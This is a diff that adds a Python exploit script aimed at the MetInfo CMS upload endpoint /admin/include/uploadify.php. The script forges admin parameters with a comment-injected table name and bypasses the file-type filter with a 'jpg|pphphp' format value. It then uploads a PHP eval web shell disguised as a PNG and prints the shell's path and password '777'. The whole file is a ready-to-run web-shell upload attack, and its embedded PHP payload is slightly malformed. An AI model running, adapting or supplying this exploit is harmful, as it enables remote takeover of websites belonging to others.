@@ -1,0 +1,40 @@
+#conding = utf-8
+
+from cgitb import text
+import requests
+import sys
+
+banner = '''
+Author: Ghoul
+Usage: python3 *.py http://....
+'''
+
+description = """
+/admin/include/uploadify.php?metinfo_admin_id=aaa&metinfo_admin_pass=bbb&met_admin_table=met_admin_table%23&type=upfile&met_file_format=jpg|pphphp
+"""
+
+headers ={
+    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
+}
+
+def attack(url):
+    payload = "/admin/include/uploadify.php?metinfo_admin_id=aaa&metinfo_admin_pass=bbb&met_admin_table=met_admin_table%23&type=upfile&met_file_format=jpg|pphphp"
+
+    full_url= url + payload
+
+    files ={
+        'Filedata':('yjh.php',"<?php @eval($_REQUEST[777];phpinfo();)?>","image/png")
+    }
+
+    res = requests.post(url = full_url,headers =headers, files =files)
+
+    return f"Shell Path: {url}{res.text[4:]} Pass: 777"
+
+
+if __name__ == "__main__":
+    if len(sys.argv) <2:
+        print(banner)
+        exit()
+
+    url = sys.argv[1]
+    print(attack(url))
